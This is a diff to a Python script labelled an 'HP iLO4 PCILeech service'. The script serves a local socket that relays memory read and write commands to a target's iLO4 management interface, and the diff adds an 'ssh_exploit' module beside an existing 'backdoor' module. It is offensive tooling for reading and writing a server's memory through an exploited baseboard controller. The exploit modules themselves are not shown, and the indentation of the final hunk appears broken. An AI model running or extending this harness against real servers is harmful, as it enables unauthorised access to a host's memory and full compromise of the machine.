@@ -1,37 +1,43 @@
 #!/usr/bin/python
 
+import argparse
 import socket
 import sys
 from struct import pack,unpack_from
 
 from mod_backdoor import *
-
-from dbg import *
+from mod_ssh_exploit import *
 
 STATUS = 0
 MEM_READ = 1
 MEM_WRITE = 2
 
-mods = {"backdoor": ModBackdoor}
+mods = {"backdoor": ModBackdoor, "ssh_exploit": ModSSHExploit}
 
-if len(sys.argv) != 3:
-	print "usage: %s <ilo ip address> <mode>" % sys.argv[0]
-	print "\tmode: %s" % ", ".join(mods.keys())
-	sys.exit(1)
+parser = argparse.ArgumentParser(description="HP iLO4 PCILeech service")
+parser.add_argument('remote_addr', help="IP address of the target iLO4 interface")
+parser.add_argument('-m', '--module', type=str, default='backdoor', help="Module to use (%s)" % ", ".join(mods.keys()))
+parser.add_argument('-u', '--user', type=str, default='', help="user name")
+parser.add_argument('-p', '--password', type=str, default='', help="SSH password")
+parser.add_argument('-P', '--port', type=int, default=22, help="SSH port")
+parser.add_argument('-v', '--verbose', action='store_true', help="verbosity")
 
-ilo_address = sys.argv[1]
-mode = sys.argv[2]
+args = parser.parse_args()
 
-if mode in mods:
-	mod = mods[mode](ilo_address, VERBOSE)
+if args.module in mods:
+	try:
+		mod = mods[args.module](args)
+	except Exception as e:
+		print "Error: %s" % e
+		sys.exit(1)
 else:
-	print "Bad mode specified"
+	print "Bad module specified"
 	sys.exit(1)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_address = ('127.0.0.1', 8888)
-if VERBOSE:
+if args.verbose:
 	print 'starting up on %s port %s' % server_address
 
 sock.bind(server_address)
@@ -44,7 +50,7 @@ def send_response(sock, cmd_id, addr, data):
 
 def handle(sock, data):
 	cmd_id, ptr, sz = unpack_from("<3Q", data)
-	if VERBOSE:
+	if args.verbose:
 		print "[*] CMD: %x, PTR: %x, SZ: %x" % (cmd_id, ptr, sz)
 
 	if cmd_id == STATUS:
@@ -53,7 +59,8 @@ def handle(sock, data):
 	elif cmd_id == MEM_READ:
 		try:
 			output = mod.dump_memory(ptr, sz)
-		except:
+		except Exception as e:
+			print "Exception:",e
 			output = ""
 		send_response(sock, cmd_id, ptr, output)
 	elif cmd_id == MEM_WRITE:
@@ -65,12 +72,15 @@ def handle(sock, data):
 while True:
     connection, client_address = sock.accept()
     try:
-        while True:
-            data = connection.recv(24)
-            if data:
-                handle(connection,data)
-            else:
-                break
-            
-    finally:
-        connection.close()
+		if not mod.start():
+			raise Exception("Fail starting module")
+		while True:
+		    data = connection.recv(24)
+		    if data:
+		        handle(connection,data)
+		    else:
+		        break
+    except Exception as e:
+    	print "Exception:",e
+    connection.close()
+    mod.stop()
